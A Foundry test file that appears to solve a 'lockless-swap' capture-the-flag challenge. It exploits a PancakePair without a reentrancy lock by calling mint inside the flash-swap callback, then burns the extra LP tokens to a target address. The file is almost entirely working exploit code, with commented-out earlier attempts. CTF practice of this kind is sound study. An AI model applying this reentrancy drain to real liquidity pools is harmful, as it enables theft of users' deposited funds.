// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/lockless-swap/Challenge.sol";

contract ContractTest is Test {
    Challenge ChallengeContract;
    ERC20 public token0;
    ERC20 public token1;
    PancakePair public pair;

    function setUp() public {
        ChallengeContract = new Challenge(address(msg.sender));
    }

    function testExploit() public {
        token0 = ChallengeContract.token0();
        token1 = ChallengeContract.token1();
        pair = ChallengeContract.pair();
        token1.balanceOf(address(0xf2331a2d));

        //pair.mint(address(this));
        //pair.burn(address(this));

        pair.getReserves();
        ChallengeContract.faucet();

        console.log("my token0 balance", token1.balanceOf(address(this)));
        console.log("my pair balance", pair.balanceOf(address(this)));
        //  token0.transfer(address(pair),1e18);

        pair.swap(99e18 - 1e10, 99e18 - 1e10, address(this), "123");
        console.log("my token0 balance", token0.balanceOf(address(this)));
        console.log("my token1 balance", token1.balanceOf(address(this)));
        console.log("my pair balance", pair.balanceOf(address(this)));

        pair.transfer(address(pair), pair.balanceOf(address(this)));
        pair.burn(address(0xf2331a2d));
        console.log(
            "folk token0 balance",
            token0.balanceOf(address(0xf2331a2d))
        );
        console.log(
            "folk token1 balance",
            token0.balanceOf(address(0xf2331a2d))
        );
    }

    function pancakeCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        console.log("amount1", amount1);
        console.log("my token1 balance", token1.balanceOf(address(this)));
        console.log("pair balance 0", token0.balanceOf(address(pair)));
        console.log("pair balance 1", token1.balanceOf(address(pair)));

        token0.transfer(address(pair), 1e18);
        token1.transfer(address(pair), 1e18);
        pair.mint(address(this));
        token0.transfer(address(pair), 99e18 - 1e10);
        token1.transfer(address(pair), 99e18 - 1e10);

        // token1.transfer(address(pair), 99e18);

        // pair.swap(98e18, 0, address(this), "");
        // pair.skim(address(this));
        // pair.sync();

        // (uint256 a0Out, uint256 a1Out, ) = pair.getReserves();
        // console.log("reverse a0Out", a0Out);
        // console.log("reverse a1Out", a1Out);
        // token0.transfer(address(pair), 30e18);
        // pair.swap(0, 89e18, address(this), "");

        // console.log("my token11 balance", token1.balanceOf(address(this)));
        // console.log("my token00 balance", token0.balanceOf(address(this)));

        //  token1.transfer(address(pair),99e18);
        //  token1.transfer(address(pair),99e18);
    }
}
